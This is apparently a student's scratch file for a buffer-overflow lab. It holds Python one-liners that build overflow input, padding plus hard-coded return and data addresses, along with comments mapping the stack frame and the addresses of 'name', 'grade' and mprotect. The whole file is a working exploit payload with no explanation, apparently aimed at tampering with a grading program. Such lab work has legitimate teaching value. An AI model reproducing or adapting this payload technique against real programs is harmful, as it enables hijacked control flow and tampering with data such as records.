
#python -c 'print "Wright Kim" + "\x00"*88 + "\x07\x00\x00\x00" + "\x01\x00\x00\x00"+"\x79\x2e\x12\x40" + "\x08\xf0\xff\xbf" + "\xa6\x85\x04\x08" + "\x80\xa0\x04\x08"' >> input.txt

python -c 'print "Wright Kim" + "\x00"*(88+4+4+4+4) + "\xa6\x85\x04\x08" + "\x80\xa0\x04\x08"' >> name.txt 

#ebp: bf ff ef e8 or bf ff f0 08
#ret: 080485a6
#name: 0804a080
#count i: 0804a044
#grade: 0804a02c

#ebp + 8: name
#ebp + 4: ret addr back to main right after readString call
#ebp - 4: 0x40122e79 <mprotect+25>
#ebp - 8: 0x1
#ebp - 12: 0x7
#ebp - 16: 0xbf ff f0 08
